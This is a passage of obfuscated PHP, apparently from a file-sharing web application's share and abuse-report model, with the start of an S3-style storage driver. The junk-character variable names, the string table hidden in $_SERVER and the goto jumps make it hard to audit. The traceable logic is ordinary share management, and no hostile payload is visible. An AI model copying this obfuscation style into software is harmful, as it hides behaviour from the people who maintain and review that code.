š¦İÈ]; $Íêäòæò = array($×ƒ€ÔñÃ[1644] => USER_ID, $×ƒ€ÔñÃ[1165] => $Ùš´»Ñ); return $this->_getShareInfo($Íêäòæò); } private function _getShareInfo($¤ë¥©—Ú) { $ÛÀµ®¾° =& $_SERVER[Æ š¦İÈ]; $ÅÁ¼äöº = $this->where($¤ë¥©—Ú)->find(); if (!$ÅÁ¼äöº) { return !1; } $¤ë¥©—Ú = array($ÛÀµ®¾°[490] => $ÅÁ¼äöº[$ÛÀµ®¾°[490]]); $Óø·‰¹Š = $ÛÀµ®¾°[1949]; $¼šÅàå» = Model($ÛÀµ®¾°[598])->order($ÛÀµ®¾°[403])->field($Óø·‰¹Š)->where($¤ë¥©—Ú)->select(); if ($ÅÁ¼äöº[$ÛÀµ®¾°[405]] == $ÛÀµ®¾°[192]) { $ÅÁ¼äöº[$ÛÀµ®¾°[87]] = IO::info($ÅÁ¼äöº[$ÛÀµ®¾°[1165]]); } else { $ÅÁ¼äöº[$ÛÀµ®¾°[87]] = Model($ÛÀµ®¾°[1316])->pathInfo($ÅÁ¼äöº[$ÛÀµ®¾°[405]]); } $ÅÁ¼äöº[$ÛÀµ®¾°[1950]] = $¼šÅàå»; return $ÅÁ¼äöº; } protected function getInfoAuth($ƒ¶À˜àî) { $™èõ˜ê® =& $_SERVER[Æ š¦İÈ]; $Ãíçœ¬‚ = $this->getInfo($ƒ¶À˜àî); if ($Ãíçœ¬‚[$™èõ˜ê®[1644]] == USER_ID) { $Ãíçœ¬‚[$™èõ˜ê®[416]] = $Ãíçœ¬‚[$™èõ˜ê®[87]][$™èõ˜ê®[416]]; } else { $Ãíçœ¬‚[$™èõ˜ê®[416]] = Model($™èõ˜ê®[504])->authMake($Ãíçœ¬‚[$™èõ˜ê®[1950]]); } return $Ãíçœ¬‚; } protected function listData($Ìàº¸´Ş = null, $‚äó¾Œ½ = 300) { $×à¶—‘­ =& $_SERVER[Æ š¦İÈ]; $œâÁ¬ = array(array($×à¶—‘­[495] => array($×à¶—‘­[1003], 0), $×à¶—‘­[497] => array($×à¶—‘­[1003], 0), $×à¶—‘­[1951] => $×à¶—‘­[1907])); if ($Ìàº¸´Ş == $×à¶—‘­[1952]) { $œâÁ¬ = array($×à¶—‘­[495] => 1); } else { if ($Ìàº¸´Ş == $×à¶—‘­[1150]) { $œâÁ¬ = array($×à¶—‘­[497] => 1); } } $œâÁ¬[$×à¶—‘­[1644]] = USER_ID; $¯Õœˆ™¼ = $this->where($œâÁ¬)->selectPage($‚äó¾Œ½); return $¯Õœˆ™¼; } protected function listToMe($–¶¸¡¦Æ = 300) { $Ù¤Ó‚ˆ =& $_SERVER[Æ š¦İÈ]; $À¶½¼× = Model($Ù¤Ó‚ˆ[1953])->userGroupParents(USER_ID); $¢şÄ‚‚¦ = array($Ù¤Ó‚ˆ[582] => SourceModel::TYPE_USER, $Ù¤Ó‚ˆ[506] => USER_ID); if ($À¶½¼×) { $¢şÄ‚‚¦ = array(array($Ù¤Ó‚ˆ[582] => SourceModel::TYPE_USER, $Ù¤Ó‚ˆ[506] => USER_ID), array($Ù¤Ó‚ˆ[582] => SourceModel::TYPE_GROUP, $Ù¤Ó‚ˆ[506] => array($Ù¤Ó‚ˆ[7], $À¶½¼×)), $Ù¤Ó‚ˆ[1951] => $Ù¤Ó‚ˆ[1907]); } $Ğş‘§À˜ = Model($Ù¤Ó‚ˆ[598])->where($¢şÄ‚‚¦)->selectPage($–¶¸¡¦Æ); $°İ‹‡‘ = array_to_keyvalue_group($Ğş‘§À˜[$Ù¤Ó‚ˆ[366]], $Ù¤Ó‚ˆ[490]); if (!$°İ‹‡‘) { return $Ğş‘§À˜; } $ßâÍ°ßÀ = $Ù¤Ó‚ˆ[1954]; $¢şÄ‚‚¦ = array($Ù¤Ó‚ˆ[490] => array($Ù¤Ó‚ˆ[421], array_keys($°İ‹‡‘)), $Ù¤Ó‚ˆ[1644] => array($Ù¤Ó‚ˆ[1005], $Ù¤Ó‚ˆ[192])); $æ–êëÙ„ = $this->field($ßâÍ°ßÀ)->where($¢şÄ‚‚¦)->select(); foreach ($æ–êëÙ„ as $÷ª¯ ¡Î => &$¥Âû‰Ã) { $¥Âû‰Ã[$Ù¤Ó‚ˆ[1950]] = $°İ‹‡‘[$¥Âû‰Ã[$Ù¤Ó‚ˆ[490]]]; } unset($¥Âû‰Ã); $‚Ì—¯µ = array($Ù¤Ó‚ˆ[1955] => $æ–êëÙ„, $Ù¤Ó‚ˆ[1956] => $Ğş‘§À˜[$Ù¤Ó‚ˆ[363]]); return $‚Ì—¯µ; } protected function shareAdd($øï…ˆ§, $Œç•Éğ¸) { $ü‰â†õ =& $_SERVER[Æ š¦İÈ]; $ö±ñÒö = $this->_addShareData($øï…ˆ§, $Œç•Éğ¸); if (!empty($Œç•Éğ¸[$ü‰â†õ[1957]])) { $this->_shareAuthSet($ö±ñÒö, $Œç•Éğ¸[$ü‰â†õ[1957]]); } $this->shareEventAdd($øï…ˆ§, $Œç•Éğ¸, $ü‰â†õ[1153]); return $ö±ñÒö; } protected function shareAddSystem($—¯ĞÀ, $Ì÷»‹÷€) { $¦Èñ´À =& $_SERVER[Æ š¦İÈ]; $î’ğí¹ò = $this->_addShareData($—¯ĞÀ, $Ì÷»‹÷€, $¦Èñ´À[1265]); $this->_shareAuthSet($î’ğí¹ò, $Ì÷»‹÷€[$¦Èñ´À[1957]]); return $î’ğí¹ò; } private function shareEventAdd($€ø·Ë³, $°®´ÕîÏ, $¾å£ü´Û = "\x61\144\144") { $Şİ³ÜÀŠ =& $_SERVER[Æ š¦İÈ]; if (!$€ø·Ë³ || $€ø·Ë³ == $Şİ³ÜÀŠ[192]) { return; } if ($¾å£ü´Û == $Şİ³ÜÀŠ[1153]) { if ($°®´ÕîÏ[$Şİ³ÜÀŠ[495]] == $Şİ³ÜÀŠ[89]) { Model($Şİ³ÜÀŠ[566])->eventShare($€ø·Ë³, $Şİ³ÜÀŠ[1958]); } if ($°®´ÕîÏ[$Şİ³ÜÀŠ[497]] == $Şİ³ÜÀŠ[89]) { Model($Şİ³ÜÀŠ[566])->eventShare($€ø·Ë³, $Şİ³ÜÀŠ[1959]); } return; } $¨ËŸÂØ… = $this->getInfoByPath($€ø·Ë³); $üÜÑáİô = $Şİ³ÜÀŠ[1960]; if ($¨ËŸÂØ…[$Şİ³ÜÀŠ[495]] == $Şİ³ÜÀŠ[192] && $°®´ÕîÏ[$Şİ³ÜÀŠ[495]] == $Şİ³ÜÀŠ[89]) { $üÜÑáİô = $Şİ³ÜÀŠ[1958]; } if ($¨ËŸÂØ…[$Şİ³ÜÀŠ[495]] == $Şİ³ÜÀŠ[89] && $°®´ÕîÏ[$Şİ³ÜÀŠ[495]] == $Şİ³ÜÀŠ[192]) { $üÜÑáİô = $Şİ³ÜÀŠ[1961]; } if ($¨ËŸÂØ…[$Şİ³ÜÀŠ[497]] == $Şİ³ÜÀŠ[192] && $°®´ÕîÏ[$Şİ³ÜÀŠ[497]] == $Şİ³ÜÀŠ[89]) { $üÜÑáİô = $Şİ³ÜÀŠ[1959]; } if ($¨ËŸÂØ…[$Şİ³ÜÀŠ[497]] == $Şİ³ÜÀŠ[89] && $°®´ÕîÏ[$Şİ³ÜÀŠ[497]] == $Şİ³ÜÀŠ[192]) { $üÜÑáİô = $Şİ³ÜÀŠ[1962]; } Model($Şİ³ÜÀŠ[566])->eventShare($€ø·Ë³, $üÜÑáİô); return; } private function _addShareData($·ËÂ–‚·, $£ù»ğ = array(), $°Ìû‹ıó = false) { $ø©‡Õ» =& $_SERVER[Æ š¦İÈ]; $ìÌ·×‡ó = $°Ìû‹ıó == $ø©‡Õ»[1265] ? 0 : USER_ID; $ÖÅª‘€ò = array($ø©‡Õ»[420] => $·ËÂ–‚·, $ø©‡Õ»[1635] => $ìÌ·×‡ó); if ($·ËÂ–‚· == 0) { $ÖÅª‘€ò = array($ø©‡Õ»[1963] => $£ù»ğ[$ø©‡Õ»[1165]], $ø©‡Õ»[1635] => $ìÌ·×‡ó); } if ($ıÇ¦°™å = $this->where($ÖÅª‘€ò)->find()) { return $ıÇ¦°™å[$ø©‡Õ»[490]]; } if ($·ËÂ–‚· == 0) { $ôõ”‹ãÁ = array($ø©‡Õ»[32] => get_path_this($£ù»ğ[$ø©‡Õ»[78]])); } else { $ôõ”‹ãÁ = Model($ø©‡Õ»[822])->sourceInfo($·ËÂ–‚·); if (!$ôõ”‹ãÁ) { return !1; } } if (!$£ù»ğ[$ø©‡Õ»[1544]]) { $£ù»ğ[$ø©‡Õ»[1544]] = $ôõ”‹ãÁ[$ø©‡Õ»[32]]; } $Ü«£ğÔñ = array($ø©‡Õ»[1635] => $ìÌ·×‡ó, $ø©‡Õ»[420] => $·ËÂ–‚·, $ø©‡Õ»[1544] => $ø©‡Õ»[12], $ø©‡Õ»[495] => 0, $ø©‡Õ»[497] => 0, $ø©‡Õ»[1165] => $ø©‡Õ»[12], $ø©‡Õ»[304] => $ø©‡Õ»[12], $ø©‡Õ»[880] => $ø©‡Õ»[12], $ø©‡Õ»[1964] => 0, $ø©‡Õ»[1965] => 0, $ø©‡Õ»[498] => 0, $ø©‡Õ»[499] => $ø©‡Õ»[12], $ø©‡Õ»[492] => $ø©‡Õ»[12]); $±±ñœš’ = explode($ø©‡Õ»[50], $ø©‡Õ»[1966]); foreach ($±±ñœš’ as $¢ªíüŸ™) { if (!isset($£ù»ğ[$¢ªíüŸ™])) { continue; } $Ü«£ğÔñ[$¢ªíüŸ™] = $£ù»ğ[$¢ªíüŸ™]; } $›Óóí‡º = $this->add($Ü«£ğÔñ); $·Î»À†• = array($ø©‡Õ»[492] => short_id($›Óóí‡º)); $this->where(array($ø©‡Õ»[489] => $›Óóí‡º))->save($·Î»À†•); return $›Óóí‡º; } private function _shareAuthSet($•ó›ó¸Ò, $Óµš‡ß) { $¬‡»¹ =& $_SERVER[Æ š¦İÈ]; if (!is_array($Óµš‡ß)) { return !1; } $÷…Äû«ü = Model($¬‡»¹[1917]); $÷…Äû«ü->where(array($¬‡»¹[490] => $•ó›ó¸Ò))->delete(); $ĞÁ©Íşë = array(); foreach ($Óµš‡ß as $ïı¾…˜) { $„öè•÷… = SourceModel::TYPE_USER; if ($ïı¾…˜[$¬‡»¹[414]] == SourceModel::TYPE_GROUP) { $„öè•÷… = SourceModel::TYPE_GROUP; } $Æ¶ÑÖ¼º = array($¬‡»¹[490] => $•ó›ó¸Ò, $¬‡»¹[414] => $„öè•÷…, $¬‡»¹[506] => intval($ïı¾…˜[$¬‡»¹[506]]), $¬‡»¹[1913] => 0, $¬‡»¹[1967] => -1); if ($ïı¾…˜[$¬‡»¹[1913]]) { $Æ¶ÑÖ¼º[$¬‡»¹[1913]] = $ïı¾…˜[$¬‡»¹[1913]]; } else { if ($ïı¾…˜[$¬‡»¹[1967]]) { $Æ¶ÑÖ¼º[$¬‡»¹[1967]] = $ïı¾…˜[$¬‡»¹[1967]]; } } $ĞÁ©Íşë[] = $Æ¶ÑÖ¼º; } return $÷…Äû«ü->addAll($ĞÁ©Íşë, array(), !0); } public function numViewAdd($Ğ˜á¥ƒ) { $·ÎŒõ·À =& $_SERVER[Æ š¦İÈ]; $Â÷üĞ† = array($·ÎŒõ·À[489] => $Ğ˜á¥ƒ); $this->where($Â÷üĞ†)->setAdd($·ÎŒõ·À[1964]); } public function numDownloadAdd($£Òçå¡¾) { $ûáòÚâù =& $_SERVER[Æ š¦İÈ]; $Éáí½èÇ = array($ûáòÚâù[489] => $£Òçå¡¾); $this->where($Éáí½èÇ)->setAdd($ûáòÚâù[1965]); } protected function shareEdit($’•¢¥¼Š, $à¬¤ƒ¿í) { $Ûü§“«¿ =& $_SERVER[Æ š¦İÈ]; $ğ¡üÒÊ™ = $this->getInfo($’•¢¥¼Š); if (!$ğ¡üÒÊ™) { return !1; } $this->_checkLinkShare($à¬¤ƒ¿í, $ğ¡üÒÊ™); $¡û±°œ¥ = array(); $»¶Íñò¶ = explode($Ûü§“«¿[50], $Ûü§“«¿[1968]); foreach ($»¶Íñò¶ as $îĞ”Ù¶Œ) { if (!array_key_exists($îĞ”Ù¶Œ, $à¬¤ƒ¿í)) { continue; } $¡û±°œ¥[$îĞ”Ù¶Œ] = $à¬¤ƒ¿í[$îĞ”Ù¶Œ]; } $this->shareEventAdd($ğ¡üÒÊ™[$Ûü§“«¿[405]], $à¬¤ƒ¿í, $Ûü§“«¿[1782]); $this->where(array($Ûü§“«¿[489] => $’•¢¥¼Š))->save($¡û±°œ¥); if (isset($à¬¤ƒ¿í[$Ûü§“«¿[1957]])) { $this->_shareAuthSet($’•¢¥¼Š, $à¬¤ƒ¿í[$Ûü§“«¿[1957]]); } return !0; } private function _checkLinkShare($ÍˆÓ±¸Ü, $Ùòşºíâ) { $ÑÕµªÛÓ =& $_SERVER[Æ š¦İÈ]; if ($ÍˆÓ±¸Ü[$ÑÕµªÛÓ[495]] != $ÑÕµªÛÓ[89]) { return; } $¿ è·Ï× = $Ùòşºíâ[$ÑÕµªÛÓ[87]][$ÑÕµªÛÓ[405]]; if ($Ùòşºíâ[$ÑÕµªÛÓ[87]][$ÑÕµªÛÓ[33]] != $ÑÕµªÛÓ[194]) { $©ôöÇ‰¶ = $this->_folderReport($¿ è·Ï×); if (!$©ôöÇ‰¶) { return; } show_json(LNG($ÑÕµªÛÓ[1969]) . $ÑÕµªÛÓ[1970] . $©ôöÇ‰¶, !1); } $Ò¦Ø¾ş½ = Model($ÑÕµªÛÓ[822])->fileInfoGet($Ùòşºíâ[$ÑÕµªÛÓ[87]][$ÑÕµªÛÓ[405]]); if (!$Ò¦Ø¾ş½) { return; } $ÆÃ±ª¦œ = $this->shareFileMeta($Ò¦Ø¾ş½[$ÑÕµªÛÓ[469]]); if (isset($ÆÃ±ª¦œ[$ÑÕµªÛÓ[371]]) && $ÆÃ±ª¦œ[$ÑÕµªÛÓ[371]] == $ÑÕµªÛÓ[89]) { show_json(LNG($ÑÕµªÛÓ[1971]), !1); } } private function _folderReport($ëß×ŒÜë) { $¸ÏæÎ°ñ =& $_SERVER[Æ š¦İÈ]; $Ü„¢÷¾¦ = array($¸ÏæÎ°ñ[469] => array($¸ÏæÎ°ñ[1003], 0), $¸ÏæÎ°ñ[747] => 3); $¥øİÁ‚Ø = Model($¸ÏæÎ°ñ[1972])->where($Ü„¢÷¾¦)->field($¸ÏæÎ°ñ[469])->select(); if (!$¥øİÁ‚Ø) { return !1; } $¥øİÁ‚Ø = array_to_keyvalue($¥øİÁ‚Ø, $¸ÏæÎ°ñ[12], $¸ÏæÎ°ñ[469]); $ŠâıÑÈ = $¸ÏæÎ°ñ[50] . $ëß×ŒÜë . $¸ÏæÎ°ñ[50]; $Ü„¢÷¾¦ = array($¸ÏæÎ°ñ[469] => array($¸ÏæÎ°ñ[7], $¥øİÁ‚Ø), $¸ÏæÎ°ñ[523] => array($¸ÏæÎ°ñ[380], "\45{$ŠâıÑÈ}\x25"), $¸ÏæÎ°ñ[433] => 0); $â™…°·Ö = Model($¸ÏæÎ°ñ[822])->where($Ü„¢÷¾¦)->field($¸ÏæÎ°ñ[1973])->find(); if (!$â™…°·Ö) { return !1; } $İœ¿úà = substr($â™…°·Ö[$¸ÏæÎ°ñ[523]], strpos($â™…°·Ö[$¸ÏæÎ°ñ[523]], $ŠâıÑÈ)); $Ü„¢÷¾¦ = array($¸ÏæÎ°ñ[405] => array($¸ÏæÎ°ñ[7], trim($İœ¿úà, $¸ÏæÎ°ñ[50]))); $âí„À²¾ = Model($¸ÏæÎ°ñ[822])->where($Ü„¢÷¾¦)->field($¸ÏæÎ°ñ[32])->select(); $õÌ·ê…³ = array_to_keyvalue($âí„À²¾, $¸ÏæÎ°ñ[12], $¸ÏæÎ°ñ[32]); $õÌ·ê…³[] = $â™…°·Ö[$¸ÏæÎ°ñ[32]]; return implode($¸ÏæÎ°ñ[8], $õÌ·ê…³); } protected function remove($Ù¡ŞŸæ¡) { $¹±Úï¶ =& $_SERVER[Æ š¦İÈ]; if (is_array($Ù¡ŞŸæ¡)) { $Ù¡ŞŸæ¡ = array($¹±Úï¶[7], $Ù¡ŞŸæ¡); } $‘çªí²Œ = array($¹±Úï¶[490] => $Ù¡ŞŸæ¡); $Ú¾ËöÊÅ = $this->where($‘çªí²Œ)->delete(); if ($Ú¾ËöÊÅ) { Model($¹±Úï¶[598])->where(array($¹±Úï¶[490] => $Ù¡ŞŸæ¡))->delete(); } $†®Îéˆğ = is_array($Ù¡ŞŸæ¡) ? $Ù¡ŞŸæ¡[1] : array($Ù¡ŞŸæ¡); for ($ğìÍ÷ßä = 0; $ğìÍ÷ßä < count($†®Îéˆğ); $ğìÍ÷ßä++) { $ÄÄ×ºİÒ = $this->getInfo($†®Îéˆğ[$ğìÍ÷ßä]); if ($ÄÄ×ºİÒ[$¹±Úï¶[497]] == $¹±Úï¶[89]) { Model($¹±Úï¶[566])->eventShare($ÄÄ×ºİÒ[$¹±Úï¶[405]], $¹±Úï¶[1962]); } if ($ÄÄ×ºİÒ[$¹±Úï¶[495]] == $¹±Úï¶[89]) { Model($¹±Úï¶[566])->eventShare($ÄÄ×ºİÒ[$¹±Úï¶[405]], $¹±Úï¶[1961]); } } return $Ú¾ËöÊÅ; } protected function removeBySource($Ãìî—‚£) { $„üÇœÇ =& $_SERVER[Æ š¦İÈ]; $Èîêğˆ‘ = array($„üÇœÇ[420] => array($„üÇœÇ[421], $Ãìî—‚£)); $ëì•Ú£– = $this->field($„üÇœÇ[490])->where($Èîêğˆ‘)->select(); $ëì•Ú£– = array_to_keyvalue($ëì•Ú£–, $„üÇœÇ[12], $„üÇœÇ[490]); if (!$ëì•Ú£–) { return; } $Èîêğˆ‘ = array($„üÇœÇ[489] => array($„üÇœÇ[421], $ëì•Ú£–)); $this->where($Èîêğˆ‘)->delete(); Model($„üÇœÇ[598])->where($Èîêğˆ‘)->delete(); } public function listAll($ÅæËÍ ø) { $˜‰ıöß =& $_SERVER[Æ š¦İÈ]; $æåªÃÇ· = array(); if ($ÅæËÍ ø[$˜‰ıöß[1644]]) { $æåªÃÇ·[$˜‰ıöß[1644]] = $ÅæËÍ ø[$˜‰ıöß[1644]]; } if ($ÅæËÍ ø[$˜‰ıöß[758]]) { $Éä‹â¯ = $ÅæËÍ ø[$˜‰ıöß[498]] ? $ÅæËÍ ø[$˜‰ıöß[498]] : strtotime(date($˜‰ıöß[1974])); $æåªÃÇ·[$˜‰ıöß[195]] = array($˜‰ıöß[330], array($ÅæËÍ ø[$˜‰ıöß[758]], $Éä‹â¯)); } if ($ÅæËÍ ø[$˜‰ıöß[33]]) { $æåªÃÇ·[$ÅæËÍ ø[$˜‰ıöß[33]]] = 1; } else { $æåªÃÇ·[] = array($˜‰ıöß[495] => array($˜‰ıöß[1003], 0), $˜‰ıöß[497] => array($˜‰ıöß[1003], 0), $˜‰ıöß[1951] => $˜‰ıöß[1907]); } if ($ÅæËÍ ø[$˜‰ıöß[1903]]) { $æåªÃÇ·[] = array($˜‰ıöß[492] => $ÅæËÍ ø[$˜‰ıöß[1903]], $˜‰ıöß[1544] => array($˜‰ıöß[380], "\x25{$ÅæËÍ ø[$˜‰ıöß[1903]]}\45"), $˜‰ıöß[1951] => $˜‰ıöß[1907]); } $ùŒš€ø = $this->_makeOrder()->where($æåªÃÇ·)->selectPage(20); if (empty($ùŒš€ø[$˜‰ıöß[366]])) { return array(); } $this->_listDataApply($ùŒš€ø[$˜‰ıöß[366]]); return $ùŒš€ø; } public function listDataApply($Ü¥ãÌâ) { $this->_listDataApply($Ü¥ãÌâ); return $Ü¥ãÌâ; } private function _listDataApply(&$ÈüıãÙó) { $…•’Œ¹¬ =& $_SERVER[Æ š¦İÈ]; $Ã×âùË¹ = array_to_keyvalue($ÈüıãÙó, $…•’Œ¹¬[12], $…•’Œ¹¬[1644]); $¶¶÷î = Model($…•’Œ¹¬[540])->userListInfo(array_unique($Ã×âùË¹)); $’¤×ÉÙï = array_to_keyvalue($ÈüıãÙó, $…•’Œ¹¬[12], $…•’Œ¹¬[405]); $úíüÊÏ‚ = Model($…•’Œ¹¬[822])->sourceListInfo($’¤×ÉÙï, !0); foreach ($ÈüıãÙó as $Ş‹ìß€ù => &$ÃÇ¿È‡ã) { $ßë¨Á²ø = $ÃÇ¿È‡ã[$…•’Œ¹¬[1644]]; $ÃÇ¿È‡ã[$…•’Œ¹¬[1975]] = $¶¶÷î[$ßë¨Á²ø] ? $¶¶÷î[$ßë¨Á²ø] : !1; $ëÅğ‡ß = $ÃÇ¿È‡ã[$…•’Œ¹¬[405]]; $ÃÇ¿È‡ã[$…•’Œ¹¬[87]] = $úíüÊÏ‚[$ëÅğ‡ß] ? $úíüÊÏ‚[$ëÅğ‡ß] : !1; if ($ÃÇ¿È‡ã[$…•’Œ¹¬[87]][$…•’Œ¹¬[433]] == $…•’Œ¹¬[89]) { unset($ÈüıãÙó[$Ş‹ìß€ù]); } if ($ÃÇ¿È‡ã[$…•’Œ¹¬[87]] != $…•’Œ¹¬[192] && !$ÃÇ¿È‡ã[$…•’Œ¹¬[87]]) { unset($ÈüıãÙó[$Ş‹ìß€ù]); } } unset($ÃÇ¿È‡ã); $ÈüıãÙó = array_values($ÈüıãÙó); } private function _makeOrder($àé§íƒ = '') { $Ì©¹Êíï =& $_SERVER[Æ š¦İÈ]; $ŞÕä¤âê = array($Ì©¹Êíï[195], $Ì©¹Êíï[498], $Ì©¹Êíï[1964], $Ì©¹Êíï[1965]); $é¥‰·ùè = array($Ì©¹Êíï[450] => $Ì©¹Êíï[451], $Ì©¹Êíï[452] => $Ì©¹Êíï[453]); $šÃÂ‘õ = Input::get($Ì©¹Êíï[457], $Ì©¹Êíï[7], $Ì©¹Êíï[426], $ŞÕä¤âê); $Óß¤­ = Input::get($Ì©¹Êíï[458], $Ì©¹Êíï[7], $Ì©¹Êíï[1976], array($Ì©¹Êíï[1902], $Ì©¹Êíï[452])); $Óß¤­ = $é¥‰·ùè[$Óß¤­]; $àé§íƒ = $àé§íƒ . "{$šÃÂ‘õ}\x20{$Óß¤­}"; return $this->order($àé§íƒ); } public function reportAdd($ß¯ãïûÂ) { $çÑÀ×·Ä =& $_SERVER[Æ š¦İÈ]; $Ë‹ÙÏÅá = array($çÑÀ×·Ä[490] => $ß¯ãïûÂ[$çÑÀ×·Ä[490]], $çÑÀ×·Ä[1644] => USER_ID); if (Model($çÑÀ×·Ä[1972])->where($Ë‹ÙÏÅá)->find()) { return !1; } $ÛÕß´‰è = array($çÑÀ×·Ä[490] => $ß¯ãïûÂ[$çÑÀ×·Ä[490]], $çÑÀ×·Ä[1544] => $ß¯ãïûÂ[$çÑÀ×·Ä[1544]], $çÑÀ×·Ä[405] => $ß¯ãïûÂ[$çÑÀ×·Ä[405]], $çÑÀ×·Ä[469] => $ß¯ãïûÂ[$çÑÀ×·Ä[469]], $çÑÀ×·Ä[1644] => USER_ID, $çÑÀ×·Ä[33] => $ß¯ãïûÂ[$çÑÀ×·Ä[33]], $çÑÀ×·Ä[453] => $ß¯ãïûÂ[$çÑÀ×·Ä[453]]); return Model($çÑÀ×·Ä[1972])->add($ÛÕß´‰è); } public function reportList($ê‡İúÙ) { $™ïî‚õÖ =& $_SERVER[Æ š¦İÈ]; $¢åÇ‡ = array(); if ($ê‡İúÙ[$™ïî‚õÖ[758]]) { $”ì²ëí = $ê‡İúÙ[$™ïî‚õÖ[498]] ? $ê‡İúÙ[$™ïî‚õÖ[498]] : strtotime(date($™ïî‚õÖ[1974])); $¢åÇ‡[$™ïî‚õÖ[195]] = array($™ïî‚õÖ[330], array($ê‡İúÙ[$™ïî‚õÖ[758]], $”ì²ëí)); } if (isset($ê‡İúÙ[$™ïî‚õÖ[33]]) && in_array($ê‡İúÙ[$™ïî‚õÖ[33]], array($™ïî‚õÖ[89], $™ïî‚õÖ[437], $™ïî‚õÖ[1977], $™ïî‚õÖ[1978], $™ïî‚õÖ[1979]))) { $¢åÇ‡[$™ïî‚õÖ[33]] = $ê‡İúÙ[$™ïî‚õÖ[33]]; } if (isset($ê‡İúÙ[$™ïî‚õÖ[747]]) && in_array($ê‡İúÙ[$™ïî‚õÖ[747]], array($™ïî‚õÖ[192], $™ïî‚õÖ[89], $™ïî‚õÖ[437], $™ïî‚õÖ[1977]))) { $¢åÇ‡[$™ïî‚õÖ[747]] = $ê‡İúÙ[$™ïî‚õÖ[747]]; } $ïØˆ¼Ï = Input::get($™ïî‚õÖ[458], $™ïî‚õÖ[7], $™ïî‚õÖ[1976], array($™ïî‚õÖ[1902], $™ïî‚õÖ[452])); $°Ö°™†Ú = array($™ïî‚õÖ[450] => $™ïî‚õÖ[451], $™ïî‚õÖ[452] => $™ïî‚õÖ[453]); $©é„ò = $™ïî‚õÖ[1980] . $°Ö°™†Ú[$ïØˆ¼Ï]; $“‰›Î¤ = Model($™ïî‚õÖ[1972])->where($¢åÇ‡)->order($©é„ò)->selectPage(20); if (empty($“‰›Î¤[$™ïî‚õÖ[366]])) { return array(); } $åÙ£×ïë = array_to_keyvalue_group($“‰›Î¤[$™ïî‚õÖ[366]], $™ïî‚õÖ[747], $™ïî‚õÖ[490]); if (!empty($åÙ£×ïë[0])) { $ê‡İúÙ = $åÙ£×ïë[0]; $¢åÇ‡ = array($™ïî‚õÖ[490] => array($™ïî‚õÖ[7], $ê‡İúÙ)); $§µÊ¤°¬ = $this->where($¢åÇ‡)->field($™ïî‚õÖ[490])->select(); $§µÊ¤°¬ = array_to_keyvalue($§µÊ¤°¬, $™ïî‚õÖ[12], $™ïî‚õÖ[490]); $ù£¼ÆĞ” = array_diff($ê‡İúÙ, $§µÊ¤°¬); if (!empty($ù£¼ÆĞ”)) { foreach ($“‰›Î¤[$™ïî‚õÖ[366]] as $àíÙ–ˆ => $· ‚â¢) { if (in_array($· ‚â¢[$™ïî‚õÖ[490]], $ù£¼ÆĞ”)) { unset($“‰›Î¤[$™ïî‚õÖ[366]][$àíÙ–ˆ]); } } } } $this->_listDataApply($“‰›Î¤[$™ïî‚õÖ[366]]); return $“‰›Î¤; } public function reportStatus($•¡‰Š®Ç) { $ªæ”¥éì =& $_SERVER[Æ š¦İÈ]; $ñî¥ú¯ß = array($ªæ”¥éì[403] => $•¡‰Š®Ç[$ªæ”¥éì[403]]); $ãØÇçĞœ = Model($ªæ”¥éì[1972])->where($ñî¥ú¯ß)->field($ªæ”¥éì[1981])->find(); if (!$ãØÇçĞœ) { return !1; } $ô¨–€±ß = array($ªæ”¥éì[747] => $•¡‰Š®Ç[$ªæ”¥éì[747]]); if ($•¡‰Š®Ç[$ªæ”¥éì[747]] == $ªæ”¥éì[1977] && $ãØÇçĞœ[$ªæ”¥éì[747]] == $ªæ”¥éì[1977]) { $ô¨–€±ß[$ªæ”¥éì[747]] = 0; } $ÄÅ½ÓÑ¤ = Model($ªæ”¥éì[1972])->where($ñî¥ú¯ß)->save($ô¨–€±ß); if ($•¡‰Š®Ç[$ªæ”¥éì[747]] == $ªæ”¥éì[437]) { if ($ãØÇçĞœ[$ªæ”¥éì[469]] != $ªæ”¥éì[192] && $this->shareFileMeta($ãØÇçĞœ[$ªæ”¥éì[469]])) { $this->shareFileMeta($ãØÇçĞœ[$ªæ”¥éì[469]], 0); } $this->remove($ãØÇçĞœ[$ªæ”¥éì[490]]); return !0; } if ($ÄÅ½ÓÑ¤ && $•¡‰Š®Ç[$ªæ”¥éì[747]] == $ªæ”¥éì[1977]) { $ìŞãéã² = $ô¨–€±ß[$ªæ”¥éì[747]] == $ªæ”¥éì[1977] ? 1 : 0; $this->shareFileMeta($ãØÇçĞœ[$ªæ”¥éì[469]], $ìŞãéã²); $this->removeByFile($ãØÇçĞœ[$ªæ”¥éì[469]]); } return $ÄÅ½ÓÑ¤; } private function removeByFile($¤ìî¤Ùó) { $¨È„¼Ï– =& $_SERVER[Æ š¦İÈ]; $°§Áô¹ = Model($¨È„¼Ï–[822])->where(array($¨È„¼Ï–[469] => $¤ìî¤Ùó))->field($¨È„¼Ï–[405])->select(); $˜‡®Ÿ¬ä = array_to_keyvalue($°§Áô¹, $¨È„¼Ï–[12], $¨È„¼Ï–[405]); $½ƒßèß = array($¨È„¼Ï–[405] => array($¨È„¼Ï–[7], $˜‡®Ÿ¬ä), $¨È„¼Ï–[495] => 1); $°§Áô¹ = $this->where($½ƒßèß)->field($¨È„¼Ï–[490])->select(); if (empty($°§Áô¹)) { return; } $ã¹ú™êÇ = array_to_keyvalue($°§Áô¹, $¨È„¼Ï–[12], $¨È„¼Ï–[490]); $this->remove($ã¹ú™êÇ); } private function shareFileMeta($÷àÊä‚, $ëØÕ›¢… = null) { $°ĞöŞ¿ê =& $_SERVER[Æ š¦İÈ]; $´áàÛÑ¿ = array($°ĞöŞ¿ê[469] => $÷àÊä‚, $°ĞöŞ¿ê[95] => $°ĞöŞ¿ê[1982]); if (is_null($ëØÕ›¢…)) { return Model($°ĞöŞ¿ê[1983])->where($´áàÛÑ¿)->find(); } $´áàÛÑ¿[$°ĞöŞ¿ê[371]] = $ëØÕ›¢…; Model($°ĞöŞ¿ê[1983])->add($´áàÛÑ¿, array(), !0); } } goto B¢’å°ã‡; C­ŒÑâ: class PathDriverEDS extends PathDriverMinIO { public function __construct($Üâµùé) { parent::__construct($Üâµùé); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($¶ú¥¬˜Á) { parent::__construct($¶ú¥¬˜Á); $this->signatureVersion($_SERVER[Æ š¦İÈ][213]); } public function uploadFormData($èç¬¦‡ş, $Ïğ¿¢™× = 3600) { $èœ¶ıù± =& $_SERVER[Æ š¦İÈ]; $îÏ¦Ó°» = $èœ¶ıù±[193]; $«‚Á°Û = $èœ¶ıù±[1335]; 